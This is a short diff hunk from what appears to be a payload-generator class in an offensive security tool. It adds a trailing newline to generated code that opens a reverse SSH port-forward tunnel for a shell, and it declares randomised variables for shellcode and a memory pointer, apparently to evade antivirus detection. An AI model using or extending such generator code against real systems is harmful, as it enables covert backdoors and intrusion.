@@ -100,7 +100,7 @@ class Payload:
 		main2 += "\n\t\ttry:"
 		main2 += "\n\t\t\t%s(int(%s), %s[0], %s[1], %s.get_transport())" % (rfwtunnel_func, shellport_var, remote_var, remote_var, client_var)
 		main2 += "\n\t\texcept Exception:"
-		main2 += "\n\t\t\tpass\n\t\t\ttime.sleep(5)"
+		main2 += "\n\t\t\tpass\n\t\t\ttime.sleep(5)\n"
 
 		shellcode_var = helpers.randomString()
 		ptr_var = helpers.randomString()
